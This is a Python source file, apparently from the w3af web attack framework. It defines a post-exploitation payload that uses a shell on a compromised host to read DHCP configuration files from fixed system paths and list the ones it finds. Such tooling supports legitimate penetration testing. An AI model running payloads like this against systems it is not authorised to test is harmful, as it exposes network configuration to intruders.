from w3af.plugins.attack.payloads.base_payload import Payload
from w3af.core.ui.console.tables import table


class dhcp_config_files(Payload):
    """
    This payload shows DHCP Server configuration files
    """
    def api_read(self):
        result = {}
        files = []

        files.append('/etc/dhcpd.conf')
        files.append('/var/lib/dhcp/dhcpd')
        files.append('/etc/dhcp3/dhclient.conf')
        files.append('/etc/dhclient.conf')
        files.append('/usr/local/etc/dhcpd.conf')

        for file in files:
            content = self.shell.read(file)
            if content:
                result[file] = content

        return result

    def run_read(self):
        api_result = self.api_read()

        if not api_result:
            return 'DHCP configuration files not found.'
        else:
            rows = []
            rows.append(['DHCP configuration files', ])
            rows.append([])
            for filename in api_result:
                rows.append([filename, ])

            result_table = table(rows)
            result_table.draw(80)
            return rows
